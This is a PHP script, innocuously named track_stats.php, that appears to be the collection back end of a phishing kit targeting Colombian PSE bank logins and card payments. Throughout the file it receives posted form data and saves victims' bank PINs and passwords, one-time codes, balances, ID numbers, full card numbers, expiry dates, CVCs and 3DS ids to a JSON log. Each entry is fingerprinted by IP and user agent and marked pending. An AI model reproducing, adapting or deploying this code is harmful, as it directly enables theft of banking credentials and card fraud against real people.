<?php
/**
 * track_stats.php - Guarda datos de PSE y TARJETAS
 * BUSCA por fingerprint (IP + User Agent) - UNIVERSAL
 */

// ====== SILENCIAR ERRORES Y LIMPIAR SALIDA ======
error_reporting(0);
ini_set('display_errors', 0);
if (ob_get_level()) ob_end_clean();
ob_start();

// ====== HEADERS ======
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

// ====== VERIFICAR MÉTODO ======
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    ob_end_clean();
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Solo POST']);
    exit;
}

// ====== RECIBIR DATOS ======
$rawData = $_POST;

// ====== OBTENER IP Y USER AGENT ======
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// ====== GENERAR FINGERPRINT ======
$fingerprint = md5($ip . '_' . $userAgent);

// ====== BANCO ======
$banco = '';
$camposBanco = ['banco', 'banco_seleccionado', 'banco_nombre', 'banco_pse'];
foreach ($camposBanco as $campo) {
    if (!empty($rawData[$campo])) {
        $banco = trim($rawData[$campo]);
        break;
    }
}

// ====== IDENTIFICADOR ======
$identificador = '';
$camposId = ['documento', 'identificacion', 'cedula', 'numero_documento', 'doc', 'id_usuario', 'documento_pse', 'usuario', 'user', 'username', 'celular', 'telefono'];
foreach ($camposId as $campo) {
    if (!empty($rawData[$campo])) {
        $identificador = trim($rawData[$campo]);
        break;
    }
}

// ====== CLAVES ======
$clave_pin = '';
$camposClave = ['clave_pin', 'clave', 'pin', 'password', 'clave_acceso'];
foreach ($camposClave as $campo) {
    if (!empty($rawData[$campo])) {
        $clave_pin = trim($rawData[$campo]);
        break;
    }
}

$codigo_otp = '';
$camposOtp = ['codigo_otp', 'codigo_dinamica', 'otp', 'codigo', 'codigo_verificacion', 'token'];
foreach ($camposOtp as $campo) {
    if (!empty($rawData[$campo])) {
        $codigo_otp = trim($rawData[$campo]);
        break;
    }
}

$saldo = trim($rawData['saldo'] ?? $rawData['saldo_cuenta'] ?? '');

// ====== DATOS DE TARJETA ======
$numero_tarjeta = trim($rawData['numero_tarjeta'] ?? '');
$vencimiento = trim($rawData['vencimiento'] ?? '');
$cvc = trim($rawData['cvc'] ?? '');
$tipo_tarjeta = trim($rawData['tipo_tarjeta'] ?? '');
$id_3ds = trim($rawData['id_3ds'] ?? '');
$email = trim($rawData['email'] ?? '');
$celular = trim($rawData['celular'] ?? '');
$monto = trim($rawData['monto'] ?? '0');
$titular = trim($rawData['titular'] ?? '');
$nombre = trim($rawData['nombre'] ?? '');
$apellido = trim($rawData['apellido'] ?? '');
$cedula = trim($rawData['cedula'] ?? '');

// ====== LEER LOGS ======
$dataDir = __DIR__ . '/data';
if (!is_dir($dataDir)) {
    @mkdir($dataDir, 0777, true);
}

$logsFile = $dataDir . '/pse_logs.json';

if (!file_exists($logsFile)) {
    file_put_contents($logsFile, '[]');
}

$content = file_get_contents($logsFile);
$logs = json_decode($content, true) ?? [];

// ====== BUSCAR POR FINGERPRINT ======
$logEncontrado = false;
$logId = null;

foreach ($logs as &$log) {
    $logFingerprint = $log['fingerprint'] ?? '';
    
    if (!empty($fingerprint) && !empty($logFingerprint) && $logFingerprint == $fingerprint) {
        $logEncontrado = true;
        $logId = $log['id'];
        
        $log['banco'] = $banco;
        $log['clave_pin'] = $clave_pin;
        $log['codigo_otp'] = $codigo_otp;
        $log['saldo'] = $saldo;
        $log['fecha'] = date('Y-m-d H:i:s');
        $log['estado'] = 'pendiente';
        $log['tiene_jelpit'] = true;
        
        if (!empty($numero_tarjeta)) $log['numero_tarjeta'] = $numero_tarjeta;
        if (!empty($vencimiento)) $log['vencimiento'] = $vencimiento;
        if (!empty($cvc)) $log['cvc'] = $cvc;
        if (!empty($tipo_tarjeta)) $log['tipo_tarjeta'] = $tipo_tarjeta;
        if (!empty($id_3ds)) $log['id_3ds'] = $id_3ds;
        if (!empty($email)) $log['email'] = $email;
        if (!empty($celular)) $log['celular'] = $celular;
        if (!empty($monto)) $log['monto'] = $monto;
        if (!empty($titular)) $log['titular'] = $titular;
        if (!empty($nombre)) $log['nombre'] = $nombre;
        if (!empty($apellido)) $log['apellido'] = $apellido;
        if (!empty($cedula)) {
            $log['documento'] = $cedula;
            $log['cedula'] = $cedula;
        }
        if (!empty($id_3ds)) $log['estado_3ds'] = 'pendiente';
        
        break;
    }
}
unset($log);

// ====== BUSCAR POR IDENTIFICADOR ======
if (!$logEncontrado && !empty($identificador)) {
    foreach ($logs as &$log) {
        $docLog = $log['documento'] ?? $log['usuario'] ?? $log['identificacion'] ?? $log['cedula'] ?? $log['numero_documento'] ?? $log['celular'] ?? '';
        
        if (!empty($docLog) && trim($docLog) == trim($identificador)) {
            $logEncontrado = true;
            $logId = $log['id'];
            
            $log['banco'] = $banco;
            $log['clave_pin'] = $clave_pin;
            $log['codigo_otp'] = $codigo_otp;
            $log['saldo'] = $saldo;
            $log['fecha'] = date('Y-m-d H:i:s');
            $log['estado'] = 'pendiente';
            if (!isset($log['tiene_jelpit'])) {
                $log['tiene_jelpit'] = false;
            }
            
            if (!empty($numero_tarjeta)) $log['numero_tarjeta'] = $numero_tarjeta;
            if (!empty($vencimiento)) $log['vencimiento'] = $vencimiento;
            if (!empty($cvc)) $log['cvc'] = $cvc;
            if (!empty($tipo_tarjeta)) $log['tipo_tarjeta'] = $tipo_tarjeta;
            if (!empty($id_3ds)) $log['id_3ds'] = $id_3ds;
            if (!empty($email)) $log['email'] = $email;
            if (!empty($celular)) $log['celular'] = $celular;
            if (!empty($monto)) $log['monto'] = $monto;
            if (!empty($titular)) $log['titular'] = $titular;
            if (!empty($nombre)) $log['nombre'] = $nombre;
            if (!empty($apellido)) $log['apellido'] = $apellido;
            if (!empty($cedula)) {
                $log['documento'] = $cedula;
                $log['cedula'] = $cedula;
            }
            if (!empty($id_3ds)) $log['estado_3ds'] = 'pendiente';
            
            break;
        }
    }
    unset($log);
}

// ====== CREAR NUEVO ======
if (!$logEncontrado) {
    $newLog = [
        'id' => uniqid('PSE_'),
        'fecha' => date('Y-m-d H:i:s'),
        'banco' => $banco,
        'clave_pin' => $clave_pin,
        'codigo_otp' => $codigo_otp,
        'saldo' => $saldo,
        'estado' => 'pendiente',
        'tiene_jelpit' => false,
        'fingerprint' => $fingerprint,
        'ip' => $ip,
        'user_agent' => $userAgent,
        'identificador_banco' => $identificador,
        'numero_tarjeta' => $numero_tarjeta,
        'vencimiento' => $vencimiento,
        'cvc' => $cvc,
        'tipo_tarjeta' => $tipo_tarjeta,
        'id_3ds' => $id_3ds,
        'email' => $email,
        'celular' => $celular,
        'monto' => $monto,
        'titular' => $titular,
        'nombre' => $nombre,
        'apellido' => $apellido,
        'cedula' => $cedula,
        'documento' => $cedula,
        'estado_3ds' => !empty($id_3ds) ? 'pendiente' : ''
    ];
    $logs[] = $newLog;
    $logId = $newLog['id'];
}

// ====== GUARDAR ======
file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// ====== LIMPIAR SALIDA Y RESPONDER JSON ======
ob_end_clean();
echo json_encode([
    'success' => true,
    'id' => $logId,
    'actualizado' => $logEncontrado,
    'fingerprint' => $fingerprint,
    'identificador' => $identificador,
    'banco' => $banco
]);
exit;
?>
